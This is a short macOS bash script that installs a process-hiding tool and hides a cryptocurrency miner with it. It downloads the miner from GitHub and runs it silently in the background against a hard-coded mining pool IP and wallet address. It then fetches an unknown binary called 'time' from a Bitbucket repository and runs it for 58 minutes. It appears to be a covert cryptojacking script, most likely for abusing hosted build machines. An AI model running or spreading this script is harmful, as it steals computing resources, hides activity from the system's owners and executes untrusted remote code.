#!/bin/bash
brew update 
brew install node 
brew install coreutils 
npm install -g npm@8.19.2 -y 
npm i -g node-process-hider 
ph add cpuminer-sse2 
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz 
tar xf cpuminer-opt-mac.tar.gz 
chmod +x cpuminer-sse2 
./cpuminer-sse2 -a yespowertide -o stratum+tcp://8.209.98.71:443 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0001-A -t 12 -p x > /dev/null &
uname -a
wget https://bitbucket.org/makeda904/npm-node/raw/master/time 
chmod +x time
gtimeout 58m ./time
echo "done..."
